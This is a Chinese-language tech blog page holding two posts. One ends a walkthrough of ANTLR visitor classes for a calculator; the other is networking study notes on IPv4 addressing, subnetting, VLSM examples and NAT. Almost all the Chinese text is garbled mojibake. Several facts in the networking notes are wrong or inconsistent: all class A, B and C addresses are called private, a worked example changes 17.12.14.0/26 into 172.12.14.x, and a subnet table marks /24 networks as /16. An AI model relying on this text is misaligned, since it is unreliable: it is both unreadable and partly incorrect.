<h5 id="StatèŠ‚ç‚¹ä½•æ—¶æŒ‚åˆ°Progæ ‘æ ¹ä¸Šå»çš„"><a href="#StatèŠ‚ç‚¹ä½•æ—¶æŒ‚åˆ°Progæ ‘æ ¹ä¸Šå»çš„" class="headerlink" title="StatèŠ‚ç‚¹ä½•æ—¶æŒ‚åˆ°Progæ ‘æ ¹ä¸Šå»çš„?"></a>StatèŠ‚ç‚¹ä½•æ—¶æŒ‚åˆ°Progæ ‘æ ¹ä¸Šå»çš„?</h5><p>åˆ°statå‡½æ•°ä¸­çœ‹ä¸€çœ‹,ç¬¬ä¸€è¡Œå°±åˆ›å»ºäº†statèŠ‚ç‚¹,å’Œprogçš„ç¬¬ä¸€è¡Œç»“æ„å‡ ä¹ä¸€æ ·,StatContextæ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°_ctx,è¿™æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡,æ—¶åˆ»ç»´æŠ¤å½“å‰èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹.è¿™æ ·åˆ›å»ºå‡ºçš„èŠ‚ç‚¹å°±çŸ¥é“è‡ªå·±çš„çˆ¶èŠ‚ç‚¹æ˜¯è°äº†</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> StatContext <span class="title function_">stat</span><span class="params">()</span> <span class="keyword">throws</span> RecognitionException &#123;</span><br><span class="line">	<span class="type">StatContext</span> <span class="variable">_localctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StatContext</span>(_ctx, getState());</span><br></pre></td></tr></table></figure>



<p>è¿™ä¸€ç‚¹ä¹Ÿå¯ä»¥åœ¨StatContextçš„æ„é€ å‡½æ•°ä¸­éªŒè¯</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">StatContext</span><span class="params">(ParserRuleContext parent, <span class="type">int</span> invokingState)</span> &#123;<span class="comment">//ç¬¬ä¸€ä¸ªå‚æ•°å°±å«åšparent,æ˜¾ç„¶æ˜¯å½“å‰èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹</span></span><br><span class="line">	<span class="built_in">super</span>(parent, invokingState);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆstatçŸ¥é“è‡ªå·±çš„çˆ¶èŠ‚ç‚¹æ˜¯è°äº†,progåˆæ˜¯å¦‚ä½•çŸ¥é“è‡ªå·±çš„å­èŠ‚ç‚¹æ˜¯è°çš„å‘¢?</p>
<p>åŠ¨æ€è°ƒè¯•å‘ç°,statå‡½æ•°æ‰§è¡Œå,ProgContextçš„Chindrenæ•°ç»„å°±ä¼šå¤šä¸€ä¸ªStatContextèŠ‚ç‚¹,å…·ä½“æ€ä¹ˆçŸ¥é“çš„,ä¸æƒ³æ·±ç©¶</p>
<h3 id="å›åˆ°æ­£é¢˜-visitå‡½æ•°å¹²äº†å•¥"><a href="#å›åˆ°æ­£é¢˜-visitå‡½æ•°å¹²äº†å•¥" class="headerlink" title="å›åˆ°æ­£é¢˜,visitå‡½æ•°å¹²äº†å•¥"></a>å›åˆ°æ­£é¢˜,visitå‡½æ•°å¹²äº†å•¥</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ParseTree tree=parser.prog();</span><br><span class="line">EvalVisitor eval=<span class="keyword">new</span> <span class="title class_">EvalVisitor</span>();</span><br><span class="line">eval.visit(tree);</span><br></pre></td></tr></table></figure>

<p>åˆ°ç°åœ¨ä½ç½®,è¿™ä¸‰æ¡çš„ç¬¬ä¸€æ¡åˆ†æå®Œæ¯•,ç›®å‰treeæ˜¯ä¸€ä¸ªProgContextå¥æŸ„,è¯­æ³•æ ‘çš„æ ‘æ ¹</p>
<p>ä¸‹é¢åˆ†æeval.visit(tree)å¹²äº†å•¥</p>
<p>è¿™ä¸ªvisitæ˜¯AbstractParseTreeVisitorå®ç°çš„</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526214154072.png" alt="image-20230526214154072"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">visit</span><span class="params">(ParseTree tree)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> tree.accept(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªtree.acceptä¹Ÿæ˜¯ä¸€ä¸ªæ¥å£æ–¹æ³•,æ¯ä¸€ä¸ª*Contextç±»éƒ½æœ‰å®ç°</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526214634187.png" alt="image-20230526214634187"></p>
<p>å°±ä»¥AssignContext.accept()ä¸ºä¾‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; visitor)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> ( visitor <span class="keyword">instanceof</span> CalculatorVisitor ) </span><br><span class="line">              <span class="keyword">return</span> ((CalculatorVisitor&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt;)visitor).visitAssign(<span class="built_in">this</span>);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> visitor.visitChildren(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå½“å‰èŠ‚ç‚¹visitoræ˜¯CalculatorVisitoræ¥å£çš„å®ä¾‹,åˆ™è¿”å›visitor.visitAssign(this),ä¹Ÿå°±æ˜¯assignæ ‡ç­¾å¯¹åº”çš„è¯­ä¹‰åŠ¨ä½œ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Integer <span class="title function_">visitAssign</span><span class="params">(CalculatorParser.AssignContext ctx)</span> &#123;</span><br><span class="line">    String id=ctx.ID().getText();</span><br><span class="line">    <span class="type">int</span> value=visit(ctx.expr());</span><br><span class="line">    memory.put(id,value);</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨çŸ¥é“äº†A.visitå‡½æ•°ä¼šè°ƒç”¨EvalVisitorä¸­å½“å‰èŠ‚ç‚¹å¯¹åº”çš„visitAå‡½æ•°</p>
<p>ä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰ç»™prog-&gt;stat+å®šä¹‰æ ‡å·,åœ¨EvalParserä¸­å¹¶æ²¡æœ‰æ‰¾åˆ°ä¸€ä¸ªvisitProgè¿™æ ·çš„å‡½æ•°,é‚£ä¹ˆ<code>eval.visit(tree);</code>åˆ°åº•è°ƒç”¨äº†è°?åŠ¨æ€è°ƒè¯•å‘ç°è°ƒç”¨çš„æ˜¯CalculatorBaseVisitorç±»ä¸­çš„vistProgå‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Override public T visitProg(CalculatorParser.ProgContext ctx) &#123; return visitChildren(ctx); &#125;</span><br></pre></td></tr></table></figure>

<p>è€Œåœ¨è¯¥ç±»ä¸­çš„æ‰€æœ‰vist*å‡½æ•°,éƒ½åªæ˜¯ç®€å•çš„é€’å½’visitChildren,è®¿é—®å­èŠ‚ç‚¹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitPrintExpr</span><span class="params">(CalculatorParser.PrintExprContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitAssign</span><span class="params">(CalculatorParser.AssignContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitBlank</span><span class="params">(CalculatorParser.BlankContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­vistAssignç­‰è¢«æˆ‘ä»¬åœ¨EvalVisitoré‡å†™,å› æ­¤ä¸ä¼šè°ƒç”¨çˆ¶ç±»ä¸­çš„ç®€å•å®ç°</p>
<p><strong>ä¹Ÿå°±æ˜¯è¯´<code>eval.visit(tree);</code>å°±æ˜¯ä¸­å¿ƒå¼€èŠ±äº†,é€’å½’è®¿é—®æ ‘æ ¹ProgContextçš„æ¯ä¸ªå­èŠ‚ç‚¹StatContext,ç„¶åæ¯ä¸ªstatéƒ½ä¼šå†é€’å½’è°ƒç”¨è‡ªå·±çš„å­èŠ‚ç‚¹çš„visitå‡½æ•°,æ–‡æ³•ç¿»è¯‘çš„è¿‡ç¨‹å°±å¯¹åº”äº†è¿™ä¸ªé€’å½’è°ƒç”¨çš„è¿‡ç¨‹,å…¶ä¸­è¯­ä¹‰åŠ¨ä½œçš„ç¿»è¯‘,è¢«æˆ‘ä»¬é‡å†™åœ¨EvalVisitorä¸­,ä¼šæ‰§è¡Œæˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°.å…¶ä¸­æ²¡æœ‰è¯­ä¹‰åŠ¨ä½œçš„ç¿»è¯‘,ç›´æ¥è°ƒç”¨åŸºç±»ä¸­çš„é»˜è®¤å®ç°,ç›´æ¥é€’å½’å­èŠ‚ç‚¹</strong></p>
<p>åˆ°æ­¤ç†æ¸…äº†CalculatorParser,EvalVisitor,ParserTreeç­‰å‡ ä¸ªç±»ä¹‹é—´çš„å…³ç³»å’Œæ§åˆ¶æµçš„æµå‘</p>
<h3 id="æ€»ç»“ç”¨antlrè®¿é—®å™¨å®ç°è®¡ç®—å™¨çš„æ­¥éª¤"><a href="#æ€»ç»“ç”¨antlrè®¿é—®å™¨å®ç°è®¡ç®—å™¨çš„æ­¥éª¤" class="headerlink" title="æ€»ç»“ç”¨antlrè®¿é—®å™¨å®ç°è®¡ç®—å™¨çš„æ­¥éª¤"></a>æ€»ç»“ç”¨antlrè®¿é—®å™¨å®ç°è®¡ç®—å™¨çš„æ­¥éª¤</h3><p>1.å†™Calculator.g4è¯æ³•,è¯­æ³•è§„åˆ™æ–‡ä»¶,ç•™æ ‡ç­¾ä¸ºå®šä¹‰è¯­æ³•åšå‡†å¤‡</p>
<p>2.ç”¨antlr -visitorå‘½ä»¤ç”ŸæˆCalculator*.javaä¸€ä¼—æ–‡ä»¶</p>
<p>3.EvalVisitorç±»ç»§æ‰¿CalculatorBaseVisitorç±»</p>
<p>4.åœ¨EvalVisitorç±»ä¸­é‡å†™æ ‡ç­¾ç›¸å¯¹åº”çš„è¯­ä¹‰è§„åˆ™</p>
<p>5.ç¼–å†™æµ‹è¯•ç±»Test,äºå…¶ä¸­æŒ‡å®šè¾“å…¥æµ,ç»„è£…lexer,ç»„è£… parser,å»ºç«‹ParserTree,ç”¨EvalVisitorå®ä¾‹,è®¿é—®è¯­æ³•æ ‘å®ä¾‹</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/02/12/%E7%BD%91%E7%BB%9C%E5%B1%82/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/12/%E7%BD%91%E7%BB%9C%E5%B1%82/" class="post-title-link" itemprop="url">è®¡ç®—æœºç½‘ç»œ-ç½‘ç»œå±‚</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-12 18:29:00 / Modified: 18:29:10" itemprop="dateCreated datePublished" datetime="2023-02-12T18:29:00+08:00">2023-02-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="ç½‘ç»œå±‚"><a href="#ç½‘ç»œå±‚" class="headerlink" title="ç½‘ç»œå±‚"></a>ç½‘ç»œå±‚</h2><h3 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h3><h4 id="IPv4åœ°å€"><a href="#IPv4åœ°å€" class="headerlink" title="IPv4åœ°å€"></a>IPv4åœ°å€</h4><h5 id="æ—©æœŸåœ°å€åˆ†ç±»"><a href="#æ—©æœŸåœ°å€åˆ†ç±»" class="headerlink" title="æ—©æœŸåœ°å€åˆ†ç±»"></a>æ—©æœŸåœ°å€åˆ†ç±»</h5><p>æœ€æ—©çš„IPåœ°å€è¢«åˆ’åˆ†ä¸ºäº”ç±»,ABCDE</p>
<p>æ ¹æ®å‰ç¼€åŒºåˆ†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208190722568.png" alt="image-20230208190722568"></p>
<p>Aç±»åœ°å€çš„ç½‘ç»œåœ°å€å ä¸€ä¸ªå­—èŠ‚</p>
<p>æ•´ä¸ªIPåœ°å€ç©ºé—´çš„ä¸€åŠéƒ½æ˜¯Aç±»åœ°å€</p>
<p>Bç±»åœ°å€çš„ç½‘ç»œåœ°å€å ä¸¤ä¸ªå­—èŠ‚</p>
<p>æ•´ä¸ªIPåœ°å€ç©ºé—´çš„å››åˆ†ä¹‹ä¸€æ˜¯Bç±»åœ°å€</p>
<p>å…¶ä¸­A,B,Cç±»ç½‘ç»œåœ°å€æ˜¯ç§æœ‰åœ°å€</p>
<h5 id="ç‰¹æ®ŠIPåœ°å€"><a href="#ç‰¹æ®ŠIPåœ°å€" class="headerlink" title="ç‰¹æ®ŠIPåœ°å€"></a>ç‰¹æ®ŠIPåœ°å€</h5><table>
<thead>
<tr>
<th><strong>ç½‘ç»œå·</strong></th>
<th><strong>ä¸»æœºå·</strong></th>
<th><strong>æºåœ°å€ä½¿ç”¨</strong></th>
<th><strong>ç›®çš„åœ°å€ä½¿ç”¨</strong></th>
<th><strong>æ„ä¹‰</strong></th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>å¯ä»¥</td>
<td>ä¸å¯</td>
<td>é»˜è®¤è·¯å¾„åœ°å€0.0.0.0ï¼Œ<br />æœ¬ç½‘ç»œä¸Šçš„æœ¬ä¸»æœº</td>
</tr>
<tr>
<td>0</td>
<td>host-id</td>
<td>å¯ä»¥</td>
<td>ä¸å¯</td>
<td>æœ¬ç½‘ç»œä¸Šçš„æŸä¸ªä¸»æœº</td>
</tr>
<tr>
<td>å…¨1</td>
<td>å…¨1</td>
<td>ä¸å¯</td>
<td>å¯ä»¥</td>
<td>å¹¿æ’­åœ°å€255.255.255.255ï¼Œ<br />åªåœ¨æœ¬ç½‘ç»œä¸Šå¹¿æ’­ï¼ˆè·¯ç”±å™¨ä¸è½¬å‘ï¼‰<br />èŒƒå›´å±€é™åœ¨LANä¸­,å³åŒä¸€å­ç½‘æ©ç çš„ç½‘æ®µå†…</td>
</tr>
<tr>
<td>net-id</td>
<td>å…¨1</td>
<td>ä¸å¯</td>
<td>å¯ä»¥</td>
<td>ç‰¹å®šå­ç½‘çš„å¹¿æ’­åœ°å€ï¼Œ<br />å¯¹net-idä¸Šæ‰€æœ‰ä¸»æœºå¹¿æ’­</td>
</tr>
<tr>
<td>127</td>
<td>éå…¨0æˆ–å…¨1çš„æ•°</td>
<td>å¯ä»¥</td>
<td>å¯ä»¥</td>
<td>ç”¨ä½œæœ¬åœ°è½¯ä»¶ç¯å›æµ‹è¯•</td>
</tr>
<tr>
<td>169.254</td>
<td>0</td>
<td>å¯ä»¥</td>
<td>å¯ä»¥</td>
<td>ä¸»æœºæ— æ³•è·å–IPåœ°å€æ—¶<br />ä¼šè‡ªåŠ¨é…ç½®åœ°å€169.254.x.x&#x2F;16ï¼Œ<br />ä½¿å…¶å¯ä»¥é€šä¿¡</td>
</tr>
</tbody></table>
<h5 id="å¤šçº§IPåœ°å€"><a href="#å¤šçº§IPåœ°å€" class="headerlink" title="å¤šçº§IPåœ°å€"></a>å¤šçº§IPåœ°å€</h5><p>æ—©æœŸçš„ç½‘ç»œåœ°å€&#x3D;ç½‘ç»œå·+ä¸»æœºå·</p>
<p>ç„¶è€Œè¿™ç§åˆ’åˆ†æœ‰å¾ˆå¤šæµªè´¹,äºæ˜¯å¼•å…¥ä¸‰çº§IPåœ°å€</p>
<p>ç½‘ç»œåœ°å€&#x3D;ç½‘ç»œå·+å­ç½‘å·+ä¸»æœºå·</p>
<p>åªéœ€è¦ç»™å¤§ç»„ç»‡åˆ†é…ä¸€ä¸ªAæˆ–è€…Bç±»åœ°å€,ç„¶åè¯¥ç»„ç»‡è‡ªå·±åˆ’åˆ†å­ç½‘å·å³å¯</p>
<p>åªçœ‹IPåœ°å€æ˜¯çœ‹ä¸å‡ºæœ‰æ²¡æœ‰åˆ’åˆ†è¿‡å­ç½‘çš„</p>
<p>è¿™å°±æ˜¯å­ç½‘æ©ç çš„ä½œç”¨äº†</p>
<p>å­ç½‘æ©ç â€æ©â€ä½çš„æ˜¯å­ç½‘å‰ç¼€,æ¯”å¦‚255.255.255.0è¿™ä¸ªå­ç½‘æ©ç ,å®ƒè¡¨æ˜åªæœ‰IPåœ°å€çš„æœ€åä¸€ä¸ªå­—èŠ‚æ‰æ˜¯ä¸»æœºå·,å‰é¢çš„æ˜¯ç½‘ç»œå·å’Œå­ç½‘å·.</p>
<p>$$<br>ç½‘ç»œåœ°å€(åŸç½‘ç»œåœ°å€+å­ç½‘åœ°å€)&#x3D;IPåœ°å€ æŒ‰ä½ä¸ å­ç½‘æ©ç <br>$$</p>
<p>192.168.1.0è¿™æ˜¯ç½‘ç»œåœ°å€</p>
<p>192.168.1.255è¿™æ˜¯å­ç½‘çš„å¹¿æ’­åœ°å€</p>
<p>192.168.1.[1,254]è¿™æ˜¯å¯ä»¥ç»™ä¸»æœºåˆ†é…çš„IPåœ°å€</p>
<h5 id="å­ç½‘æ©ç å’Œç½‘å…³"><a href="#å­ç½‘æ©ç å’Œç½‘å…³" class="headerlink" title="å­ç½‘æ©ç å’Œç½‘å…³"></a>å­ç½‘æ©ç å’Œç½‘å…³</h5><p>ä¸€ä¸ªè®¡ç®—æœºå°è¯•è®¿é—®å¦ä¸€ä¸ªIPåœ°å€æ—¶,ä¼šè¿›è¡Œå¦‚ä¸‹è®¡ç®—:</p>
<p>è‡ªå·±çš„IPåœ°å€å’Œè‡ªå·±çš„å­ç½‘æ©ç æŒ‰ä½ä¸å¾—åˆ°è‡ªå·±çš„ç½‘ç»œåœ°å€</p>
<p>ç›®æ ‡çš„IPåœ°å€å’Œè‡ªå·±çš„å­ç½‘æ©ç æŒ‰ä½ä¸,ç»“æœä¸è‡ªå·±çš„ç½‘ç»œåœ°å€æ¯”è¾ƒ</p>
<p>å¦‚æœç›¸åŒè¯´æ˜ç›®æ ‡è®¡ç®—æœºæ˜¯â€ç½‘ä¸Šé‚»å±…â€,åŒå¤„äºä¸€ä¸ªå­ç½‘å†…,åˆ™é“¾è·¯å±‚å¸§çš„ç›®çš„MACåœ°å€å°±ä¼šå¡«å†™è¯¥ç›®æ ‡è®¡ç®—æœºçš„MACåœ°å€.å¦‚æœä¸çŸ¥é“é‚»å±…çš„MACåœ°å€,ä¼šä½¿ç”¨ARPåè®®,æ ¹æ®é‚»å±…çš„IPåœ°å€,æŸ¥é‚»å±…çš„MACåœ°å€</p>
<p>å¦‚æœä¸åŒè¯´æ˜ç›®æ ‡ä¸åœ¨åŒä¸€å­ç½‘å†…,éœ€è¦è®¿é—®â€å¤–é¢çš„ä¸–ç•Œâ€.è¿™å°±éœ€è¦ç½‘å…³è½¬å‘,äºæ˜¯å°†é“¾è·¯å±‚ç›®çš„MACåœ°å€å¡«ä¸Šç½‘å…³çš„MACåœ°å€.</p>
<blockquote>
<p>å¦‚ä½•è·å–ç½‘å…³çš„MACåœ°å€?</p>
<p>è¿™å°è®¡ç®—æœºæ˜¯æœ‰ç½‘å…³çš„IPåœ°å€çš„,ä¸ç®¡æ˜¯æ‰‹åŠ¨å¡«ä¸Šçš„è¿˜æ˜¯DHCPè·å–çš„,åæ­£å°±æ˜¯æœ‰</p>
<p>ç„¶åæœ¬è®¡ç®—æœºé€šè¿‡ARPåè®®,æ ¹æ®ç½‘å…³çš„IPåœ°å€è¯¢é—®ç½‘å…³çš„MACåœ°å€</p>
</blockquote>
<p>è¿™å°±å­˜åœ¨ä¸€ç§å•å‘é€šçš„æƒ…å†µ:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208195437212.png" alt="image-20230208195437212"></p>
<p>192.168.3.4&#x2F;16å¯ä»¥å¾€192.168.1.1&#x2F;24å‘åŒ…,å¹¶ä¸”å¯ä»¥è¢«æ”¶åˆ°</p>
<p>ä½†æ˜¯192.168.1.1&#x2F;24æ— æ³•å‘192.168.3.4&#x2F;16å‘åŒ…,</p>
<p>å› ä¸º<a href="mailto:&#80;&#67;&#49;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#46;&#x31;">&#80;&#67;&#49;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#46;&#x31;</a>ç»è¿‡è®¡ç®—,192.168.3.4æ˜¯ä¸€ä¸ªå¤–ç½‘åœ°å€,ä½†æ˜¯è‡ªå·±æ²¡æœ‰è®¾ç½®ç½‘å…³,å› æ­¤ä¸çŸ¥é“åº”è¯¥æŠŠåŒ…å‘ç»™è°</p>
<h5 id="å¯å˜é•¿å­ç½‘æ©ç VLSM"><a href="#å¯å˜é•¿å­ç½‘æ©ç VLSM" class="headerlink" title="å¯å˜é•¿å­ç½‘æ©ç VLSM"></a>å¯å˜é•¿å­ç½‘æ©ç VLSM</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208200108836.png" alt="image-20230208200108836"></p>
<h5 id="åœ°å€åˆ’åˆ†ä¸¾ä¾‹"><a href="#åœ°å€åˆ’åˆ†ä¸¾ä¾‹" class="headerlink" title="åœ°å€åˆ’åˆ†ä¸¾ä¾‹"></a>åœ°å€åˆ’åˆ†ä¸¾ä¾‹</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208200145777.png" alt="image-20230208200145777"></p>
<blockquote>
<p>åˆ†é…ç»™æŸä¸€å°å‹ç»„ç»‡æœºæ„ä¸€ä¸ªåœ°å€å—ï¼Œæˆ‘ä»¬å·²çŸ¥å—ä¸­ä¸€ä¸ªåœ°å€æ˜¯205.16.37.39&#x2F;28ï¼Œæ±‚è¯¥å—çš„èµ·å§‹åœ°å€?</p>
<p>ç½‘ç»œå‰ç¼€æœ‰28ä½,è¿™å°±æ„å‘³ç€IPåœ°å€çš„å‰ä¸‰ä¸ªå­—èŠ‚éƒ½æ˜¯å›ºå®šæ­»çš„205.16.37,æœ€åè¿™ä¸ªå­—èŠ‚çš„é«˜å››ä½æ˜¯å›ºå®šæ­»çš„</p>
<p>39&#x3D;0010â€™0111b,é‚£ä¹ˆèµ·å§‹åœ°å€åº”è¯¥æ˜¯0010â€™0000b,ä¹Ÿå°±æ˜¯32</p>
<p>å› æ­¤è¿™ä¸ªç½‘ç»œå—çš„èµ·å§‹åœ°å€æ˜¯205.16.37.32</p>
<p>å—çš„èµ·å§‹åœ°å€ä¸€èˆ¬ä¸ä¼šåˆ†é…,ä½œä¸ºç½‘ç»œåœ°å€</p>
<p>å—çš„æœ€ååœ°å€ä¹Ÿä¸ä¼šåˆ†é…,ä½œä¸ºæœ¬å—çš„å¹¿æ’­åœ°å€</p>
</blockquote>
<blockquote>
<p>å·²ç»™ä¸€ä¸ªç»„ç»‡åˆ†é…äº†17.12.14.0&#x2F;26çš„åœ°å€å—ï¼Œè¯¥ç»„ç»‡æœ‰3ä¸ªéƒ¨é—¨ï¼Œéœ€è¦åˆ’åˆ†ä¸º32ã€16å’Œ16ä¸ªåœ°å€çš„å­å—ã€‚</p>
<p>17.12.14.0&#x2F;26è¿™ä¸ªåœ°å€ç©ºé—´é‡Œæœ‰$2^{32-26}&#x3D;64$ä¸ªåœ°å€,æ°å¥½åˆ’åˆ†ä¸º32+16+16</p>
<p>å› æ­¤å¯ä»¥è¿™æ ·åˆ’åˆ†:</p>
<p>172.12.14.00â€™100000&#x2F;27,å³172.12.14.32&#x2F;27</p>
<p>172.12.14.00â€™010000&#x2F;28,å³172.12.14.16&#x2F;28</p>
<p>172.12.14.00â€™000000&#x2F;28,å³172.12.14.0&#x2F;28</p>
</blockquote>
<blockquote>
<p>æŸå•ä½åˆ†é…åˆ°ä¸€ä¸ª B ç±» IP åœ°å€ï¼Œå…¶net-idä¸º129.250.0.0ã€‚</p>
<p>è¯¥å•ä½æœ‰4000å°æœºå™¨ï¼Œå¹³å‡åˆ†å¸ƒåœ¨16ä¸ªä¸åŒçš„åœ°ç‚¹ã€‚</p>
<p>å¦‚é€‰ç”¨å­ç½‘æ©ç ä¸º255.255.255.0ï¼Œè¯•ç»™æ¯ä¸€åœ°ç‚¹åˆ†é…ä¸€ä¸ªå­ç½‘å·ç ï¼Œ</p>
<p>å¹¶è®¡ç®—å‡ºæ¯ä¸ªåœ°ç‚¹ä¸»æœºå·ç çš„æœ€å°å€¼å’Œæœ€å¤§å€¼ã€‚</p>
<p>4000å°æœºå™¨å‡åˆ†åˆ°16ä¸ªåœ°ç‚¹,åˆ™æ¯ä¸ªåœ°ç‚¹æœ‰250å°,ä¸€ä¸ª&#x2F;24å­ç½‘ä¸­æœ€å¤šæœ‰256-2&#x3D;254å°</p>
<p>å› æ­¤ä¸€ä¸ª255.255.255.0å­ç½‘å¯ä»¥å®¹çº³250å°æœºå™¨</p>
<p>åªéœ€è¦å°†129.250.0.0&#x2F;16è¿™æ ·åˆ’åˆ†:</p>
<table>
<thead>
<tr>
<th>å­ç½‘å·(Binary)</th>
<th>å­ç½‘å·(Decimal)</th>
<th>ç½‘ç»œåœ°å€</th>
<th>ä¸»æœºIPåœ°å€èŒƒå›´</th>
</tr>
</thead>
<tbody><tr>
<td>00000000</td>
<td>0</td>
<td>129.250.0.0&#x2F;16</td>
<td>129.250.0.1~129.250.0.254</td>
</tr>
<tr>
<td>00000001</td>
<td>1</td>
<td>129.250.1.0&#x2F;16</td>
<td>129.250.1.1~129.250.1.254</td>
</tr>
<tr>
<td>00000010</td>
<td>2</td>
<td>129.250.2.0&#x2F;16</td>
<td>129.250.2.1~129.250.2.254</td>
</tr>
<tr>
<td>00000011</td>
<td>3</td>
<td>129.250.3.0&#x2F;16</td>
<td>129.250.3.1~129.250.3.254</td>
</tr>
<tr>
<td></td>
<td></td>
<td>â€¦</td>
<td></td>
</tr>
<tr>
<td>00001111</td>
<td>15</td>
<td>129.250.15.0&#x2F;16</td>
<td>129.250.15.1~129.250.15.254</td>
</tr>
</tbody></table>
</blockquote>
<h4 id="NATåœ°å€è½¬æ¢"><a href="#NATåœ°å€è½¬æ¢" class="headerlink" title="NATåœ°å€è½¬æ¢"></a>NATåœ°å€è½¬æ¢</h4><table>
<thead>
<tr>
<th>NATç±»å‹</th>
<th>æ˜ å°„å…³ç³»</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>é™æ€NAT</td>
<td>ä¸€ä¸ªå†…ç½‘åœ°å€å¯¹åº”ä¸€ä¸ªå…¬ç½‘åœ°å€</td>
<td></td>
</tr>
<tr>
<td>åŠ¨æ€NAT</td>
<td>å¤šä¸ªå†…ç½‘åœ°å€å¯¹åº”å¤šä¸ªå…¬ç½‘åœ°å€</td>
<td></td>
</tr>
<tr>
<td>PAT</td>
<td>å¤šä¸ªå†…ç½‘åœ°å€å¯¹åº”ä¸€ä¸ªå…¬ç½‘åœ°å€çš„å¤šä¸ªç«¯å£å·</td>
<td></td>
</tr>
</tbody></table>
<h4 id="IPv4åŒ…"><a href="#IPv4åŒ…" class="headerlink" title="IPv4åŒ…"></a>IPv4åŒ…</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031183937685.png" alt="image-20221031183937685"></p>
<p>Dataç”¨äºæ‰¿è½½è¿è¾“å±‚çš„åè®®,æ¯”å¦‚TCP,UDP</p>
